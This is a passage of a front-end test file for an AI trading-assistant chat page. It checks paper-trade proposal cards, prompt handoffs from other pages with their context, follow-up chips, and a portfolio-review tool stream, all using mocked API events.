    const amount = screen.getByLabelText('Amount (USD)')
    await user.clear(amount)
    await user.type(amount, '5')
    expect(screen.getByText('Minimum $10')).toBeInTheDocument()
    expect(amount).toHaveAttribute('aria-invalid', 'true')
    expect(screen.getByRole('button', { name: 'Confirm buy (paper)' })).toBeDisabled()
    await user.clear(amount)
    await user.type(amount, '$1,000')
    expect(amount).toHaveAccessibleDescription('≈ 0.011875 BTC')
    expect(order).not.toHaveBeenCalled()
  })

  it('shows an order error inline', async () => {
    vi.spyOn(api, 'placeOrder').mockRejectedValue(new ApiError(400, 'insufficient_buying_power', 'Not enough buying power'))
    const { user } = await withProposal({ ...proposal, data: { ...proposal.data, side: 'sell', stopLoss: null, takeProfit: null } } as Card)
    expect(screen.getByText('Sell BTC')).toBeInTheDocument()
    expect(screen.getAllByText('None')).toHaveLength(2)
    await user.click(screen.getByRole('button', { name: 'Confirm sell (paper)' }))
    expect(await screen.findByRole('alert')).toHaveTextContent('Not enough buying power')
  })

  it('can be dismissed and brought back', async () => {
    const { user } = await withProposal()
    await user.click(screen.getByRole('button', { name: 'Dismiss' }))
    expect(screen.getByText('Proposal dismissed · Buy $500 BTC')).toBeInTheDocument()
    await user.click(screen.getByRole('button', { name: 'Undo' }))
    expect(screen.getByRole('button', { name: 'Confirm buy (paper)' })).toBeInTheDocument()
  })

  it('lists at most five sources until expanded', async () => {
    const items = Array.from({ length: 7 }, (_, i) => ({ n: i + 1, title: `Story ${i + 1}`, url: `https://s${i}.io/x`, source: '', publishedAt: null }))
    const { user } = await withProposal({ type: 'sources', data: { items } })
    const list = screen.getByRole('list', { name: 'Sources' })
    expect(within(list).getAllByRole('listitem')).toHaveLength(5)
    await user.click(screen.getByRole('button', { name: 'Show all 7 sources' }))
    expect(within(list).getAllByRole('listitem')).toHaveLength(7)
    expect(screen.getByRole('button', { name: 'Show fewer' })).toHaveAttribute('aria-expanded', 'true')
  })
})

describe('AgentPage · entry from another page', () => {
  function EntryState() {
    return <span data-testid="entry-state">{JSON.stringify(useLocation().state)}</span>
  }
  const page = (
    <StrictMode>
      <AgentPage />
      <EntryState />
    </StrictMode>
  )
  const tick = () => act(() => new Promise((r) => setTimeout(r, 0))) // the entry send is deferred a tick
  async function enter(state: unknown) {
    const r = renderPage(page, { route: '/', path: '/', state, routes: { '/chat/:chatId': page } })
    await screen.findAllByRole('link', { name: /Older chat/ }) // it waits for the history list
    await tick()
    return r
  }

  it('waits for the history list, so the new chat stays in the sidebar', async () => {
    let list!: (v: Awaited<ReturnType<typeof api.chats>>) => void
    vi.mocked(api.chats).mockReturnValue(new Promise((r) => (list = r)))
    renderPage(page, { route: '/', path: '/', state: { prompt: 'Trade the desk view?' }, routes: { '/chat/:chatId': page } })
    await tick()
    expect(fetch).not.toHaveBeenCalled()
    await act(async () => list({ chats: [{ id: 'c0', title: 'Older chat', updatedAt: '2026-10-01T08:00:00Z' }] }))
    await waitFor(() => expect(sent()).toHaveLength(1))
    await push('chat', { chatId: 'c1', title: 'Trade the desk view?' })
    const nav = screen.getAllByRole('navigation', { name: 'Chat history' })[0]
    expect(within(nav).getByRole('link', { name: /Trade the desk view\?/ })).toHaveAttribute('href', '/chat/c1')
    expect(within(nav).getByRole('link', { name: /Older chat/ })).toBeInTheDocument()
  })

  it('sends the prompt once with its context, clears the state and keeps the context for the chat', async () => {
    const { user } = await enter({ prompt: '  Trade the desk view?  ', context: { forecastId: 'f1', symbol: 'BTC', extra: 1 } })
    await waitFor(() => expect(sent()).toHaveLength(1))
    expect(sent()[0]).toEqual({ message: 'Trade the desk view?', mode: 'quality', lens: 'auto', context: { forecastId: 'f1', symbol: 'BTC' } })
    // the state is cleared by a navigate just before the send; React commits that render after the fetch starts
    await waitFor(() => expect(screen.getByTestId('entry-state')).toHaveTextContent('null'))
    await push('chat', { chatId: 'c1', title: 'Trade the desk view?' }) // StrictMode's remount did not abort the stream
    await waitFor(() => expect(currentPath()).toBe('/chat/c1'))
    await push('done', { messageId: 'm1', credits: fx.credits })
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull())
    expect(sent()).toHaveLength(1)

    await ask(user, 'And the size?')
    expect(sent()[1]).toEqual({ chatId: 'c1', message: 'And the size?', mode: 'quality', lens: 'auto', context: { forecastId: 'f1', symbol: 'BTC' } })
    await push('done', { messageId: 'm2', credits: fx.credits })
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull())
    await user.click(screen.getAllByRole('button', { name: 'New chat' })[0])
    await ask(user, 'Fresh start')
    expect(sent()[2]).toEqual({ message: 'Fresh start', mode: 'quality', lens: 'auto' })
  })

  it('sends a bounded plain-text leaf market handoff once without an invented forecast context', async () => {
    const prompt = marketPrompt({ ...predictionMarket, desk: null }, predictionEvent, predictionBoard.asOf)
    expect(prompt.length).toBeLessThanOrEqual(4000)
    expect(prompt).toContain(predictionMarket.marketSlug)
    expect(prompt).toContain(predictionBoard.asOf)
    expect(prompt).toContain('Volatility proxy (not the desk)')
    await enter({ prompt, context: { symbol: 'BTC' } })
    await waitFor(() => expect(sent()).toEqual([{ message: prompt, mode: 'quality', lens: 'auto', context: { symbol: 'BTC' } }]))
    await waitFor(() => expect(screen.getByTestId('entry-state')).toHaveTextContent('null'))
    await push('chat', { chatId: 'market-chat', title: predictionMarket.question })
    await push('done', { messageId: 'market-message', credits: fx.credits })
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull())
    expect(sent()).toHaveLength(1)
  })

  it.each([[{ prompt: '   ' }], [{ prompt: 'x'.repeat(4001) }], [{ context: { forecastId: 'f1' } }], [null]])('ignores %j', async (state) => {
    await enter(state)
    expect(screen.getByRole('heading', { name: 'Which market is on your mind?' })).toBeInTheDocument()
    expect(fetch).not.toHaveBeenCalled()
  })
})

describe('AgentPage · follow-up chips', () => {
  it('shows chips under the latest finished answer; a click sends the prompt', async () => {
    const { user } = open()
    await ask(user, 'BTC?')
    await push('chat', { chatId: 'c1', title: 'BTC?' })
    await push('tool_call', { id: 's', name: 'suggest_followups', label: 'Suggesting next steps', input: {} })
    await push('delta', { text: 'BTC holds. **View:** bullish.' })
    await push('card', fx.followupsCard)
    expect(screen.queryByRole('list', { name: 'Suggested follow-ups' })).toBeNull() // still streaming
    expect(screen.queryByText('Suggesting next steps')).toBeNull()
    await push('done', { messageId: 'm1', credits: fx.credits })
    const chips = await screen.findByRole('list', { name: 'Suggested follow-ups' })
    expect(within(chips).getAllByRole('button').map((b) => b.textContent)).toEqual(fx.followupsCard.type === 'followups' ? fx.followupsCard.data.prompts : [])
    await user.click(within(chips).getByRole('button', { name: 'What would invalidate this?' }))
    expect(sent()[1]).toEqual({ chatId: 'c1', message: 'What would invalidate this?', mode: 'quality', lens: 'auto' })
    expect(screen.queryByRole('list', { name: 'Suggested follow-ups' })).toBeNull() // only under the latest answer
  })
})

describe('AgentPage · portfolio review tool', () => {
  it('renders actual review tool frames and measured unknown answer from the once-only plain handoff', async () => {
    const { REVIEW_PROMPT } = await import('../account/PortfolioHealth')
    renderPage(<AgentPage />, { route: '/', path: '/', state: { prompt: REVIEW_PROMPT }, routes: { '/chat/:chatId': <AgentPage /> } })
    await waitFor(() => expect(sent()).toHaveLength(1)); expect(sent()[0]).toEqual({ message: REVIEW_PROMPT, mode: 'quality', lens: 'auto' });
    await push('chat', { chatId: 'review1', title: 'Paper health' });
    await push('tool_call', { id: 'review', name: 'review_portfolio', label: 'Reviewing your portfolio', input: {} });
    expect(await screen.findByText('Reviewing your portfolio')).toBeInTheDocument();
    await push('tool_result', { id: 'review', name: 'review_portfolio', ok: true, summary: 'Revision 1; common days 12; whole-book risk unavailable.' });
    await push('delta', { text: 'Measured: 12 common days; daily risk is unavailable. Interpretation: no action is warranted from these unknowns.' });
    await push('done', { messageId: 'review-answer', credits: fx.credits });
    expect(await screen.findByText(/Measured: 12 common days/)).toBeInTheDocument(); expect(screen.queryByRole('button', { name: /Confirm|Execute/ })).toBeNull(); expect(sent()).toHaveLength(1)
  })
})
